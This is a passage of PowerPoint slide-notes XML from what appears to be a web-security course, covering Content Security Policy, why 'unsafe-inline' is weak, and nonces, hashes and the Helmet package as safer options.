            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>162</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="301826292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7396-0B5B-D67F-C5A8-E866A516F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41BB0-C191-317C-291D-8FFA37DED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7F776-0135-F08D-80B2-72BB6A2C615A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Here you’re allowing:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Styles from your origin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Plus inline styles (e.g. &lt;style&gt;...&lt;/style&gt; or style="..." attributes)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Note: 'unsafe-inline' weakens security; better patterns use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>nonces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>hashes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (we’ll cover shortly). I threw it in just to show an example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{08AF71B7-C783-E212-4534-79C5D5BC0E71}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>163</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="67822187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972BA-726E-12A4-38A2-74BCA96C3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8102C-9492-24C2-67DB-A43F32C2E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08149-8C48-B2A6-E7B2-A8B35C1F3CBF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XHR = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XMLHttpRequest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="1F1F1F"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Iframe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t> inline frame (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>iFrame</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040C28"/>
                </a:solidFill>
              </a:rPr>
              <a:t>an element that loads another HTML element inside of a web page</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. They are commonly used to embed specific content like external ads, videos, tags, or other interactive elements into the page.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="1F1F1F"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A43C43A3-FE7A-5D79-4FED-7B60643A0067}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>164</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="234755913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71C4E-A5BB-F42C-4C58-4B177710F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3C747-4FC1-E42B-73FE-115C0F28B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0D2E6-4983-CC84-D692-78059F19069A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XHR = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XMLHttpRequest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="1F1F1F"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Iframe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t> inline frame (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>iFrame</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040C28"/>
                </a:solidFill>
              </a:rPr>
              <a:t>an element that loads another HTML element inside of a web page</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. They are commonly used to embed specific content like external ads, videos, tags, or other interactive elements into the page.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="1F1F1F"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E03F03E-F72E-8C13-284D-54EDA0B643A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>165</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="338198892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EF3CD-2D22-9EED-2C87-175D06A35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50897-1B73-1DF4-0CD8-EE30DC848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A936E-2846-BF41-1A60-19455EC3550E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XHR = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1F1F1F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XMLHttpRequest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" err="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF2BF12F-CC04-23ED-C157-6E1C66E0C85B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>166</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="250369397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86757-3B32-025A-1A0B-F2E40BA68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CEB9B-BF45-FA61-F187-479959115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BF5E5-3AD1-1015-739D-2273D9507D44}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>strict</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> CSP wants to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>block all inline scripts </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(because inline is XSS-prone), but your app may need some small inline code:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>This can be safely allowed using 2 methods: Nonce's &amp; Hashes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Nonces and hashes are CSP’s way of saying:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>“This particular inline script is mine.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> If it doesn’t have my nonce or hash, don’t run it.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Both are explicitly recommended over 'unsafe-inline' (Slide 163) (which basically disables XSS protection).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{794D948C-AE1D-7E82-67C7-9F31431CD022}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>167</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="113650690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2F72-4C13-7BAA-9A76-868AEC2C4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8667A-EEB1-C50D-4122-D09A8EF5F3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02683-CC06-DBB7-62C6-B9C618DEF95D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If an attacker injects HTML but </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>can’t see</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> the nonce, they shouldn’t be able to guess it → injected &lt;script&gt;s won’t run.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The nonce should be </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>cryptographically random</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> unique per HTTP response (never reuse or hard-code)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If the nonce is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>reused across many requests</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or visible to attacker, It becomes a shared secret → attacker can reuse it in their injected scripts.</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DFA073A5-49C1-CA97-B930-9C8CE66C8855}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>168</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="101421220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6D7BB-C0F9-261D-CE50-B619910F6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902CB-80EF-7F1F-C105-10AF44FA1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34985-DCBA-47D2-4238-D6D722AE1F4C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Note to self: This is configured </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>glabally</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> on the server, not per file</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E0AE8ACA-63E9-0C2D-5CC9-7273FC3140A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>169</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="346347796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707D-01E0-1251-9A8F-5B997C8E2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A3E31-A588-2365-10D7-86E2855B7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64CD3-6DDC-F09C-8D05-648F2C5D6D05}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Recommend using JS 'Helmet' package</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Pros</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Easy to work with dynamic apps (script contents can change; nonce stays “just random”).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Smaller header footprint than hashes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Cons</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Requires server cooperation (template engine or middleware must inject nonces).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Must be generated fresh per response and not cached incorrectly.</a:t>
            </a:r>
          </a:p>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C3D008AC-8C33-65DF-A727-24811D7E2ED0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>170</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="177943917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472E7-832E-5EB5-76BD-462BE8A39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D3F9D-D83F-5D37-BEC9-A13EA6182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8104F-1808-AD3E-EDFD-57A6265788FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Meaning:</a:t>
            </a:r>
